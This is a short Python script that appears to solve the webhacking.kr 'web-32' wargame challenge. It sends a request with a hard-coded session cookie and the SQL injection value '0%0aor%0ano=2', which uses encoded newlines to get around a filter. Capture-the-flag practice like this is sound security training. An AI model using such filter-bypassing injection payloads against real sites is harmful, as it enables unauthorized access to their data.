import requests

url = "https://webhacking.kr/challenge/web-32/index.php?no="
cookie = {'PHPSESSID':'gnkigbanj4oe8it4mgu0t4b03t'}
query = "0%0aor%0ano=2"

res = requests.get(url + query, cookies = cookie)
print(res.text)
